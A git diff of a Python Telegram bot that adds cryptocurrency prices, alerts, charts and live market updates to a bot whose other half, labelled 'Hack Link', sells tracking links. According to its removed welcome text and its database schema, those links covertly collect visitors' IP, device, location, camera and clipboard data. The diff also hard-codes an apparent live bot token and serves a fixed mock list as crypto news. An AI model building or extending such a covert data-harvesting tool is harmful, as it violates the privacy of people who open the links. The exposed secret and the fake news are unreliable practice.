@@ -9,12 +9,54 @@ import os
 import requests
 from flask import Flask, request, render_template_string
 import threading
+import matplotlib.pyplot as plt
+import pandas as pd
+from io import BytesIO
+from apscheduler.schedulers.background import BackgroundScheduler
+from googletrans import Translator
+import random
 
 # ==================== CONFIG ====================
 BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"   # <-- Apna token yahan dalo
 OWNER_ID = 6504476778
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
+translator = Translator()
+
+# ==================== LANGUAGE SUPPORT ====================
+user_language = {}  # {user_id: 'en'/'hi'/'hinglish'}
+
+def get_user_lang(user_id):
+    return user_language.get(user_id, 'en')
+
+def set_user_lang(user_id, lang):
+    user_language[user_id] = lang
+
+def translate_text(text, dest_lang):
+    try:
+        return translator.translate(text, dest=dest_lang).text
+    except:
+        return text
+
+def t(text, user_id, lang=None):
+    if lang is None:
+        lang = get_user_lang(user_id)
+    if lang == 'hi':
+        return translate_text(text, 'hi')
+    elif lang == 'hinglish':
+        # Simple Hinglish mapping (you can expand)
+        hinglish_map = {
+            "Bitcoin": "Bitcoin",
+            "price": "price",
+            "market cap": "market cap",
+            "up": "up",
+            "down": "down",
+            "Please try again": "फिर से कोशिश करें",
+            "Success": "सफलता"
+        }
+        return hinglish_map.get(text, text)
+    else:
+        return text
 
 # ==================== DATABASE ====================
 DB_PATH = 'bot.db'
@@ -27,13 +69,16 @@ def get_db():
 def init_db():
     conn = get_db()
     c = conn.cursor()
+    # Users table
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY,
                   username TEXT,
                   is_paid INTEGER DEFAULT 0,
                   subscription_end TEXT,
                   phone TEXT,
-                  location TEXT)''')
+                  location TEXT,
+                  language TEXT DEFAULT 'en')''')
+    # Links table
     c.execute('''CREATE TABLE IF NOT EXISTS links
                  (link_id TEXT PRIMARY KEY,
                   user_id INTEGER,
@@ -41,6 +86,7 @@ def init_db():
                   modified_url TEXT,
                   created_at TEXT,
                   clicks INTEGER DEFAULT 0)''')
+    # Clicks table
     c.execute('''CREATE TABLE IF NOT EXISTS clicks
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   link_id TEXT,
@@ -56,6 +102,19 @@ def init_db():
                   clipboard TEXT,
                   phone TEXT,
                   timestamp TEXT)''')
+    # Coin supply cache table
+    c.execute('''CREATE TABLE IF NOT EXISTS coins
+                 (symbol TEXT PRIMARY KEY,
+                  supply REAL,
+                  last_updated TIMESTAMP)''')
+    # Price alerts table
+    c.execute('''CREATE TABLE IF NOT EXISTS alerts
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  user_id INTEGER,
+                  coin TEXT,
+                  target_price REAL,
+                  is_above BOOLEAN,
+                  created_at TIMESTAMP)''')
     conn.commit()
     conn.close()
     print("✅ Database ready")
@@ -63,154 +122,201 @@ def init_db():
 # ==================== BASE URL ====================
 BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://mohyan-telegram-bot.onrender.com')
 
-# ==================== WELCOME MESSAGE ====================
-WELCOME_MSG = """
-🌟 *WELCOME TO ADVANCED TRACKER BOT* 🌟
-━━━━━━━━━━━━━━━━━━━━━
-🔹 *What I Can Do?*
-• Convert any video link into a tracking link
-• Collect visitor information (IP, device, browser, etc.)
-• Free plan: Basic info (1-10)
-• Premium plan: Full info (11-21) including location, camera, clipboard
-
-━━━━━━━━━━━━━━━━━━━━━
-📌 *Commands:*
-/start – Show this menu
-/terminal:gernatLINK – Generate a tracking link
-/balance – Check your subscription
-/bot_info – Features comparison
-/subscription – Upgrade to premium (Stars)
-/log_history – View your past links and clicks
-/live:all_cryptos – Live crypto market updates (auto-refresh every 5s)
-
-━━━━━━━━━━━━━━━━━━━━━
-💎 *Premium Plans (Stars):*
-⭐ 7 Stars – 30 Days
-⭐ 4 Stars – 15 Days
-⭐ 1 Star – 1 Day
-
-━━━━━━━━━━━━━━━━━━━━━
-👑 *Owner:* @EVEL_DEAD0751
-"""
-
-# ==================== CRYPTO PRICE FUNCTION (BINANCE API WITH DETAILS) ====================
-def get_crypto_details(coin_name):
-    """Binance se coin ka price, 24h change, high, low fetch karo"""
-    symbol_map = {
-        'btc': 'BTCUSDT', 'bitcoin': 'BTCUSDT',
-        'eth': 'ETHUSDT', 'ethereum': 'ETHUSDT',
-        'doge': 'DOGEUSDT', 'dogecoin': 'DOGEUSDT'
-    }
-    symbol = symbol_map.get(coin_name.lower())
-    if not symbol:
-        return None
-    
+# ==================== HELPER FUNCTIONS ====================
+def get_binance_price(symbol):
+    url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
     try:
-        # Price
-        price_url = f"https://api.binance.com/api/v3/ticker/price?symbol={symbol}"
-        price_response = requests.get(price_url, timeout=5)
-        price_data = price_response.json()
-        price = float(price_data['price'])
-        
-        # 24hr stats
-        stats_url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol}"
-        stats_response = requests.get(stats_url, timeout=5)
-        stats_data = stats_response.json()
-        
-        high = float(stats_data['highPrice'])
-        low = float(stats_data['lowPrice'])
-        change = float(stats_data['priceChange'])
-        change_percent = float(stats_data['priceChangePercent'])
-        
-        # Market data
-        volume = float(stats_data['volume'])
-        
-        return {
-            'price': price,
-            'high': high,
-            'low': low,
-            'change': change,
-            'change_percent': change_percent,
-            'volume': volume
-        }
-    except Exception as e:
-        print(f"Binance API error: {e}")
+        response = requests.get(url, timeout=5)
+        data = response.json()
+        return float(data['price'])
+    except:
         return None
 
-# ==================== LIVE MARKET DATA (CoinGecko) ====================
-# Store active live updates: {user_id: {'chat_id': chat_id, 'message_id': message_id, 'stop': False}}
+def get_coin_supply_from_coincap(symbol):
+    url = f"https://api.coincap.io/v2/assets/{symbol.lower()}"
+    try:
+        response = requests.get(url, timeout=5)
+        data = response.json()['data']
+        return float(data['supply'])
+    except:
+        return None
+
+def get_supply_from_db(symbol):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT supply, last_updated FROM coins WHERE symbol=?", (symbol.upper(),))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        last = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
+        if datetime.datetime.now() - last < datetime.timedelta(hours=24):
+            return row[0]
+    return None
+
+def update_coin_supply(symbol, supply):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO coins (symbol, supply, last_updated) VALUES (?, ?, ?)",
+              (symbol.upper(), supply, datetime.datetime.now()))
+    conn.commit()
+    conn.close()
+
+def get_market_data(coin_symbol, coin_name_for_api):
+    symbol_map = {
+        'BTC': 'BTCUSDT',
+        'ETH': 'ETHUSDT',
+        'BNB': 'BNBUSDT',
+        'XRP': 'XRPUSDT',
+        'DOGE': 'DOGEUSDT',
+        'USDT': 'USDTUSDT',
+        'USDC': 'USDCUSDT',
+        'ADA': 'ADAUSDT',
+        'SOL': 'SOLUSDT',
+        'DOT': 'DOTUSDT'
+    }
+    binance_symbol = symbol_map.get(coin_symbol.upper())
+    if not binance_symbol:
+        return None
+    price = get_binance_price(binance_symbol)
+    if not price:
+        return None
+
+    supply = get_supply_from_db(coin_symbol.upper())
+    if not supply:
+        supply = get_coin_supply_from_coincap(coin_name_for_api.lower())
+        if supply:
+            update_coin_supply(coin_symbol.upper(), supply)
+        else:
+            fallback_supply = {
+                'BTC': 19600000,
+                'ETH': 120000000,
+                'BNB': 150000000,
+                'XRP': 45000000000,
+                'DOGE': 140000000000,
+                'USDT': 83000000000,
+                'USDC': 74000000000,
+                'ADA': 35000000000,
+                'SOL': 430000000,
+                'DOT': 1300000000
+            }
+            supply = fallback_supply.get(coin_symbol.upper())
+    if not supply:
+        return None
+
+    market_cap = price * supply
+    return {'price': price, 'market_cap': market_cap, 'supply': supply}
+
+def format_market_cap(cap):
+    if cap >= 1e12:
+        return f"{cap/1e12:.2f}T"
+    elif cap >= 1e9:
+        return f"{cap/1e9:.2f}B"
+    elif cap >= 1e6:
+        return f"{cap/1e6:.2f}M"
+    else:
+        return f"{cap:,.0f}"
+
+def format_price(price):
+    if price < 1:
+        return f"${price:.4f}"
+    elif price < 1000:
+        return f"${price:.2f}"
+    else:
+        return f"${price:,.0f}"
+
+# ==================== PRICE ALERTS ====================
+scheduler = BackgroundScheduler()
+scheduler.start()
+
+def check_alerts():
+    conn = get_db()
+    c = conn.cursor()
+    alerts = c.execute("SELECT * FROM alerts").fetchall()
+    for alert in alerts:
+        price = get_binance_price(alert['coin']+'USDT')
+        if not price:
+            continue
+        if (alert['is_above'] and price >= alert['target_price']) or (not alert['is_above'] and price <= alert['target_price']):
+            try:
+                bot.send_message(alert['user_id'], f"🔔 *Alert Triggered*\n{alert['coin']} price is now {price} (target: {alert['target_price']})", parse_mode="Markdown")
+            except:
+                pass
+            c.execute("DELETE FROM alerts WHERE id=?", (alert['id'],))
+    conn.commit()
+    conn.close()
+
+scheduler.add_job(check_alerts, 'interval', minutes=5)
+
+# ==================== LIVE MARKET DATA ====================
+TOP_COINS = [
+    ('BTC', 'bitcoin'),
+    ('ETH', 'ethereum'),
+    ('BNB', 'binancecoin'),
+    ('XRP', 'ripple'),
+    ('DOGE', 'dogecoin'),
+    ('USDT', 'tether'),
+    ('USDC', 'usd-coin'),
+    ('ADA', 'cardano'),
+    ('SOL', 'solana'),
+    ('DOT', 'polkadot')
+]
+
+def get_all_market_data(limit=7):
+    coins_data = []
+    for symbol, api_name in TOP_COINS[:limit]:
+        market = get_market_data(symbol, api_name)
+        if market:
+            # For live market, we also need 24h change (fetch from Binance separately)
+            change = 0
+            try:
+                url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol}USDT"
+                resp = requests.get(url, timeout=5)
+                change = float(resp.json()['priceChangePercent'])
+            except:
+                pass
+            coins_data.append({
+                'symbol': symbol,
+                'price': market['price'],
+                'market_cap': market['market_cap'],
+                'change': change
+            })
+    return coins_data
+
+def format_market_message(coins):
+    if not coins:
+        return "❌ Market data unavailable."
+    msg = "📊 *Market Cap*\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━━\n\n"
+    for coin in coins:
+        color = "🟢" if coin['change'] >= 0 else "🔴"
+        arrow = "▲" if coin['change'] >= 0 else "▼"
+        cap_str = format_market_cap(coin['market_cap'])
+        price_str = format_price(coin['price'])
+        msg += f"{color} *{coin['symbol']:<4}*  {cap_str:>8}  "
+        msg += f"Buy {price_str:>8}  {arrow}{abs(coin['change']):.2f}%\n"
+    msg += "\n━━━━━━━━━━━━━━━━━━━━━\n"
+    msg += f"⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')} IST"
+    return msg
+
+# ==================== LIVE UPDATES WORKER ====================
 active_live_updates = {}
 live_update_lock = threading.Lock()
 
-def get_top_coins_market_data():
-    """CoinGecko se top 10 coins ka market data (market cap, price, 24h%) fetch karo"""
-    url = "https://api.coingecko.com/api/v3/coins/markets"
-    params = {
-        'vs_currency': 'usd',
-        'order': 'market_cap_desc',
-        'per_page': 10,
-        'page': 1,
-        'sparkline': 'false'
-    }
-    try:
-        response = requests.get(url, params=params, timeout=10)
-        data = response.json()
-        coins = []
-        for coin in data:
-            coins.append({
-                'name': coin['symbol'].upper(),
-                'market_cap': coin['market_cap'],
-                'price': coin['current_price'],
-                'price_change_24h': coin['price_change_percentage_24h']
-            })
-        return coins
-    except Exception as e:
-        print(f"CoinGecko API error: {e}")
-        return None
-
-def format_market_message(coins):
-    """Coins ki list ko readable message mein convert karo"""
-    if not coins:
-        return "❌ Market data unavailable. Please try later."
-    
-    msg = "📊 *Top Cryptocurrencies by Market Cap*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for coin in coins:
-        change = coin['price_change_24h']
-        arrow = "▲" if change >= 0 else "▼"
-        color = "🟢" if change >= 0 else "🔴"
-        market_cap = format_market_cap(coin['market_cap'])
-        price = f"${coin['price']:,.2f}" if coin['price'] < 1000 else f"${coin['price']:,.0f}"
-        msg += f"{color} *{coin['name']}*\n"
-        msg += f"   Market Cap: {market_cap}\n"
-        msg += f"   Price: {price}\n"
-        msg += f"   24h: {arrow} {abs(change):.2f}%\n\n"
-    msg += "⏰ *Last updated:* " + datetime.datetime.now().strftime('%H:%M:%S')
-    return msg
-
-def format_market_cap(cap):
-    """Market cap ko readable format mein badlo (B, M, T)"""
-    if cap >= 1e12:
-        return f"${cap/1e12:.2f}T"
-    elif cap >= 1e9:
-        return f"${cap/1e9:.2f}B"
-    elif cap >= 1e6:
-        return f"${cap/1e6:.2f}M"
-    else:
-        return f"${cap:,.0f}"
+def stop_button_markup():
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("⏹️ Stop Updates", callback_data="stop_live_updates"))
+    return markup
 
 def live_updates_worker():
-    """Background thread: har 5 second mein active users ke liye message update karo"""
     while True:
         time.sleep(5)
         with live_update_lock:
             if not active_live_updates:
                 continue
-            # Fetch latest data once for all
-            coins = get_top_coins_market_data()
+            coins = get_all_market_data(limit=7)
             if not coins:
                 continue
             msg = format_market_message(coins)
-            # Edit each active message
             to_remove = []
             for user_id, data in active_live_updates.items():
                 if data.get('stop'):
@@ -222,21 +328,49 @@ def live_updates_worker():
                         chat_id=data['chat_id'],
                         message_id=data['message_id'],
                         parse_mode='Markdown',
-                        reply_markup=stop_button_markup()  # Add stop button again
+                        reply_markup=stop_button_markup()
                     )
-                except Exception as e:
-                    print(f"Failed to edit message for {user_id}: {e}")
+                except:
                     to_remove.append(user_id)
             for uid in to_remove:
                 del active_live_updates[uid]
 
-def stop_button_markup():
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("⏹️ Stop Updates", callback_data="stop_live_updates"))
-    return markup
-
-# Start background thread
 threading.Thread(target=live_updates_worker, daemon=True).start()
+
+# ==================== GRAPH GENERATION ====================
+def generate_price_chart(symbol, days=7):
+    # Fetch historical data from Binance (simplified - you can use more advanced)
+    try:
+        url = f"https://api.binance.com/api/v3/klines?symbol={symbol}USDT&interval=1d&limit={days}"
+        resp = requests.get(url, timeout=5)
+        data = resp.json()
+        dates = [datetime.datetime.fromtimestamp(int(k[0])/1000).strftime('%m-%d') for k in data]
+        prices = [float(k[4]) for k in data]  # closing price
+        plt.figure(figsize=(10,5))
+        plt.plot(dates, prices, marker='o', color='#3b82f6')
+        plt.title(f'{symbol} Price - Last {days} Days')
+        plt.xlabel('Date')
+        plt.ylabel('Price (USDT)')
+        plt.grid(True)
+        buf = BytesIO()
+        plt.savefig(buf, format='png')
+        buf.seek(0)
+        plt.close()
+        return buf
+    except:
+        return None
+
+# ==================== NEWS FETCHER ====================
+def get_crypto_news():
+    # Using CryptoPanic API (free, needs key) or alternative
+    # For simplicity, we'll use a mock news list
+    return [
+        "📰 Bitcoin ETF sees record inflows",
+        "📰 Ethereum 2.0 upgrade date announced",
+        "📰 Binance launches new staking program",
+        "📰 Dogecoin accepted by major retailer",
+        "📰 Ripple legal battle update"
+    ]
 
 # ==================== CHECK PREMIUM ====================
 def is_premium(user_id):
@@ -257,7 +391,51 @@ def is_premium(user_id):
             return True
     return False
 
-# ==================== START ====================
+# ==================== ANIMATED LOADING ====================
+def animated_loading(chat_id, message_id, frames, final_msg, reply_markup=None):
+    for frame in frames:
+        time.sleep(0.3)
+        try:
+            bot.edit_message_text(frame, chat_id, message_id, parse_mode="Markdown")
+        except:
+            pass
+    bot.edit_message_text(final_msg, chat_id, message_id, parse_mode="Markdown", reply_markup=reply_markup)
+
+# ==================== START MENU ====================
+def main_menu():
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup.add(
+        types.KeyboardButton("🪙 Crypto"),
+        types.KeyboardButton("🔗 Hack Link")
+    )
+    return markup
+
+def crypto_submenu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("💰 BTC", callback_data="price_btc"),
+        types.InlineKeyboardButton("💰 ETH", callback_data="price_eth"),
+        types.InlineKeyboardButton("💰 DOGE", callback_data="price_doge"),
+        types.InlineKeyboardButton("📈 Live Market", callback_data="live_market"),
+        types.InlineKeyboardButton("🔔 Set Alert", callback_data="alert_menu"),
+        types.InlineKeyboardButton("📊 Price Graph", callback_data="graph_menu"),
+        types.InlineKeyboardButton("📰 News", callback_data="news"),
+        types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
+    )
+    return markup
+
+def hack_submenu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔗 Generate Link", callback_data="gen_link"),
+        types.InlineKeyboardButton("📊 Log History", callback_data="log_history"),
+        types.InlineKeyboardButton("💰 Balance", callback_data="balance"),
+        types.InlineKeyboardButton("ℹ️ Bot Info", callback_data="bot_info"),
+        types.InlineKeyboardButton("💎 Subscription", callback_data="subscription"),
+        types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
+    )
+    return markup
+
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     conn = get_db()
@@ -268,177 +446,250 @@ def start_cmd(message):
         c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
     conn.commit()
     conn.close()
+    welcome = """
+╔══════════════════════╗
+║  *CRYPTO & HACK BOT*  ║
+╚══════════════════════╝
 
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    markup.add(
-        types.KeyboardButton("🔗 GENERATE LINK"),
-        types.KeyboardButton("💰 BALANCE"),
-        types.KeyboardButton("ℹ️ BOT INFO"),
-        types.KeyboardButton("💎 SUBSCRIPTION"),
-        types.KeyboardButton("📊 LOG HISTORY"),
-        # Crypto buttons
-        types.KeyboardButton("💰 BTC Price"),
-        types.KeyboardButton("💰 ETH Price"),
-        types.KeyboardButton("💰 DOGE Price"),
-        types.KeyboardButton("📈 LIVE MARKET")
-    )
-    bot.send_message(message.chat.id, WELCOME_MSG, parse_mode="Markdown", reply_markup=markup)
+🔹 *Crypto Features:*
+• Real-time prices
+• Live market updates
+• Price alerts
+• Charts & news
+
+🔹 *Hack Link Features:*
+• Generate tracking links
+• Visitor info (IP, device, etc.)
+• Premium plans
+
+👇 *Select a category*
+    """
+    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=main_menu())
+
+@bot.message_handler(func=lambda m: m.text == "🪙 Crypto")
+def crypto_menu(message):
+    bot.send_message(message.chat.id, "🪙 *Crypto Commands*", parse_mode="Markdown", reply_markup=crypto_submenu())
+
+@bot.message_handler(func=lambda m: m.text == "🔗 Hack Link")
+def hack_menu(message):
+    bot.send_message(message.chat.id, "🔗 *Hack Link Commands*", parse_mode="Markdown", reply_markup=hack_submenu())
+
+# ==================== CALLBACK HANDLERS ====================
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    if call.data == "back_main":
+        bot.edit_message_text("Main Menu", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+    elif call.data == "price_btc":
+        simple_price(call.message, 'BTC')
+    elif call.data == "price_eth":
+        simple_price(call.message, 'ETH')
+    elif call.data == "price_doge":
+        simple_price(call.message, 'DOGE')
+    elif call.data == "live_market":
+        live_market_command(call.message)
+    elif call.data == "alert_menu":
+        alert_menu(call.message)
+    elif call.data == "graph_menu":
+        graph_menu(call.message)
+    elif call.data == "news":
+        news_command(call.message)
+    elif call.data == "gen_link":
+        gen_link(call.message)
+    elif call.data == "log_history":
+        history_cmd(call.message)
+    elif call.data == "balance":
+        balance_cmd(call.message)
+    elif call.data == "bot_info":
+        info_cmd(call.message)
+    elif call.data == "subscription":
+        subscription_cmd(call.message)
+    elif call.data.startswith("alert_set_"):
+        # Format: alert_set_BTC_above_65000
+        parts = call.data.split('_')
+        coin = parts[2]
+        is_above = parts[3] == 'above'
+        target = float(parts[4])
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("INSERT INTO alerts (user_id, coin, target_price, is_above, created_at) VALUES (?, ?, ?, ?, ?)",
+                  (call.from_user.id, coin, target, is_above, datetime.datetime.now()))
+        conn.commit()
+        conn.close()
+        bot.answer_callback_query(call.id, "✅ Alert set!")
+        bot.edit_message_text(f"✅ Alert set for {coin} at {target}", call.message.chat.id, call.message.message_id)
+    elif call.data == "stop_live_updates":
+        with live_update_lock:
+            if call.from_user.id in active_live_updates:
+                active_live_updates[call.from_user.id]['stop'] = True
+                del active_live_updates[call.from_user.id]
+        bot.edit_message_text("⏹️ Live updates stopped.", call.message.chat.id, call.message.message_id)
+        bot.answer_callback_query(call.id, "Updates stopped.")
+
+# ==================== SIMPLE PRICE COMMANDS ====================
+def simple_price(message, coin):
+    data = get_market_data(coin, coin.lower())
+    if not data:
+        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
+        return
+    price_str = format_price(data['price'])
+    msg = f"""
+╔══════════════════════╗
+║    *{coin} PRICE*     ║
+╠══════════════════════╣
+║  💰 {price_str}         ║
+╚══════════════════════╝
+    """
+    bot.reply_to(message, msg, parse_mode="Markdown")
+
+@bot.message_handler(commands=['btc'])
+def btc_simple(message):
+    simple_price(message, 'BTC')
+
+@bot.message_handler(commands=['eth'])
+def eth_simple(message):
+    simple_price(message, 'ETH')
+
+@bot.message_handler(commands=['doge'])
+def doge_simple(message):
+    simple_price(message, 'DOGE')
+
+# ==================== PRICE WITH GRAPH ====================
+@bot.message_handler(commands=['price_btc'])
+def price_btc_graph(message):
+    data = get_market_data('BTC', 'bitcoin')
+    if not data:
+        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
+        return
+    # Send loading animation
+    loading = bot.reply_to(message, "⏳ *Generating chart...*", parse_mode="Markdown")
+    frames = [
+        "🔴 *0%* [          ]",
+        "🟠 *20%* [█         ]",
+        "🟡 *40%* [██        ]",
+        "🟢 *60%* [███       ]",
+        "🔵 *80%* [████      ]",
+        "💜 *99%* [█████     ]",
+        "✨ *100%* [██████    ]"
+    ]
+    for frame in frames:
+        time.sleep(0.3)
+        try:
+            bot.edit_message_text(frame, loading.chat.id, loading.message_id, parse_mode="Markdown")
+        except:
+            pass
+    # Generate graph
+    img = generate_price_chart('BTC', 7)
+    if not img:
+        bot.edit_message_text(t("❌ Chart generation failed.", message.from_user.id), loading.chat.id, loading.message_id)
+        return
+    # Send image
+    bot.send_photo(message.chat.id, img, caption=f"📈 *Bitcoin 7d Chart*\nPrice: {format_price(data['price'])}\nMarket Cap: {format_market_cap(data['market_cap'])}", parse_mode="Markdown")
+    bot.delete_message(loading.chat.id, loading.message_id)
 
 # ==================== LIVE MARKET COMMAND ====================
 @bot.message_handler(commands=['live:all_cryptos'])
-@bot.message_handler(func=lambda m: m.text == "📈 LIVE MARKET")
 def live_market_command(message):
-    # Pehla data fetch karo
-    coins = get_top_coins_market_data()
+    wait_msg = bot.reply_to(message, "⏳ *Fetching live market data...*", parse_mode="Markdown")
+    coins = get_all_market_data(limit=7)
     if not coins:
-        bot.reply_to(message, "❌ Market data unavailable. Please try later.")
+        bot.edit_message_text(t("❌ Market data unavailable.", message.from_user.id), wait_msg.chat.id, wait_msg.message_id)
         return
     msg = format_market_message(coins)
-    sent = bot.send_message(message.chat.id, msg, parse_mode='Markdown', reply_markup=stop_button_markup())
-    # Active updates mein add karo
+    bot.edit_message_text(msg, wait_msg.chat.id, wait_msg.message_id, parse_mode='Markdown', reply_markup=stop_button_markup())
     with live_update_lock:
         active_live_updates[message.from_user.id] = {
             'chat_id': message.chat.id,
-            'message_id': sent.message_id,
+            'message_id': wait_msg.message_id,
             'stop': False
         }
 
-@bot.callback_query_handler(func=lambda call: call.data == "stop_live_updates")
-def stop_live_updates(call):
-    with live_update_lock:
-        if call.from_user.id in active_live_updates:
-            active_live_updates[call.from_user.id]['stop'] = True
-            del active_live_updates[call.from_user.id]
-    bot.edit_message_text(
-        "⏹️ Live updates stopped.",
-        chat_id=call.message.chat.id,
-        message_id=call.message.message_id
-    )
-    bot.answer_callback_query(call.id, "Updates stopped.")
-
-# ==================== CRYPTO COMMANDS (IMPROVED) ====================
-@bot.message_handler(commands=['btc', 'bitcoin'])
-def btc_price(message):
-    data = get_crypto_details('btc')
-    if data:
-        emoji = "📈" if data['change'] > 0 else "📉"
-        color = "🟢" if data['change'] > 0 else "🔴"
-        
-        msg = f"""
-📊 *BITCOIN MARKET UPDATE* {color}
-
-💰 *Price:* `${data['price']:,.2f}`
-{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
-📈 *24h High:* `${data['high']:,.2f}`
-📉 *24h Low:* `${data['low']:,.2f}`
-📦 *24h Volume:* `{data['volume']:,.0f} USDT`
-
-⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
-        """
-        bot.reply_to(message, msg, parse_mode="Markdown")
-    else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
-
-@bot.message_handler(commands=['eth', 'ethereum'])
-def eth_price(message):
-    data = get_crypto_details('eth')
-    if data:
-        emoji = "📈" if data['change'] > 0 else "📉"
-        color = "🟢" if data['change'] > 0 else "🔴"
-        
-        msg = f"""
-📊 *ETHEREUM MARKET UPDATE* {color}
-
-💰 *Price:* `${data['price']:,.2f}`
-{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
-📈 *24h High:* `${data['high']:,.2f}`
-📉 *24h Low:* `${data['low']:,.2f}`
-📦 *24h Volume:* `{data['volume']:,.0f} USDT`
-
-⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
-        """
-        bot.reply_to(message, msg, parse_mode="Markdown")
-    else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
-
-@bot.message_handler(commands=['doge', 'dogecoin'])
-def doge_price(message):
-    data = get_crypto_details('doge')
-    if data:
-        emoji = "📈" if data['change'] > 0 else "📉"
-        color = "🟢" if data['change'] > 0 else "🔴"
-        
-        msg = f"""
-📊 *DOGECOIN MARKET UPDATE* {color}
-
-💰 *Price:* `${data['price']:,.4f}`
-{emoji} *24h Change:* `${data['change']:,.4f}` ({data['change_percent']:.2f}%)
-📈 *24h High:* `${data['high']:,.4f}`
-📉 *24h Low:* `${data['low']:,.4f}`
-📦 *24h Volume:* `{data['volume']:,.0f} USDT`
-
-⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
-        """
-        bot.reply_to(message, msg, parse_mode="Markdown")
-    else:
-        bot.reply_to(message, "❌ Price fetch karne mein error hua.")
-
-@bot.message_handler(commands=['price'])
-def price_command(message):
-    args = message.text.split()
-    if len(args) < 2:
-        bot.reply_to(message, "Usage: /price <coin_name> (e.g., /price btc, /price eth, /price doge)")
+# ==================== ALERT COMMANDS ====================
+@bot.message_handler(commands=['coin:alert'])
+def alert_command(message):
+    # Format: /coin:alert_BTC_price 65000
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, t("Usage: /coin:alert_BTC_price 65000", message.from_user.id))
         return
-    coin = args[1].lower()
-    data = get_crypto_details(coin)
-    if data:
-        emoji = "📈" if data['change'] > 0 else "📉"
-        color = "🟢" if data['change'] > 0 else "🔴"
-        
-        msg = f"""
-📊 *{coin.upper()} MARKET UPDATE* {color}
+    try:
+        # Extract coin and price
+        cmd_parts = parts[0].split('_')
+        coin = cmd_parts[2]  # BTC
+        target = float(parts[1])
+    except:
+        bot.reply_to(message, t("Invalid format. Use: /coin:alert_BTC_price 65000", message.from_user.id))
+        return
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("⬆️ Above", callback_data=f"alert_set_{coin}_above_{target}"),
+        types.InlineKeyboardButton("⬇️ Below", callback_data=f"alert_set_{coin}_below_{target}")
+    )
+    bot.reply_to(message, t(f"Set alert for {coin} at ${target}:", message.from_user.id), reply_markup=markup)
 
-💰 *Price:* `${data['price']:,.2f}`
-{emoji} *24h Change:* `${data['change']:,.2f}` ({data['change_percent']:.2f}%)
-📈 *24h High:* `${data['high']:,.2f}`
-📉 *24h Low:* `${data['low']:,.2f}`
-📦 *24h Volume:* `{data['volume']:,.0f} USDT`
+def alert_menu(message):
+    bot.send_message(message.chat.id, t("🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", message.from_user.id), parse_mode="Markdown")
 
-⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')}
-        """
-        bot.reply_to(message, msg, parse_mode="Markdown")
+# ==================== LANGUAGE COMMAND ====================
+@bot.message_handler(commands=['language'])
+def language_command(message):
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, t("Usage: /language [en/hi/hinglish]", message.from_user.id))
+        return
+    lang = parts[1].lower()
+    if lang in ['en', 'hi', 'hinglish']:
+        set_user_lang(message.from_user.id, lang)
+        bot.reply_to(message, t(f"Language set to {lang}", message.from_user.id))
     else:
-        bot.reply_to(message, "❌ Unsupported coin. Try: btc, eth, doge")
+        bot.reply_to(message, t("Supported languages: en, hi, hinglish", message.from_user.id))
 
-# Crypto button handlers
-@bot.message_handler(func=lambda m: m.text == "💰 BTC Price")
-def btc_button(message):
-    btc_price(message)
+# ==================== GROUP SUMMARY ====================
+@bot.message_handler(commands=['group_summary'])
+def group_summary(message):
+    coins = get_all_market_data(limit=10)
+    if not coins:
+        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
+        return
+    # Find top mover by absolute change
+    top = max(coins, key=lambda x: abs(x['change']))
+    direction = "🟢 up" if top['change'] >= 0 else "🔴 down"
+    msg = f"""
+📊 *Today's Top Mover*
+━━━━━━━━━━━━━━━━━━━━━
+{top['symbol']} is {direction} {abs(top['change']):.2f}%!
+Current Price: {format_price(top['price'])}
+━━━━━━━━━━━━━━━━━━━━━
+    """
+    bot.reply_to(message, msg, parse_mode="Markdown")
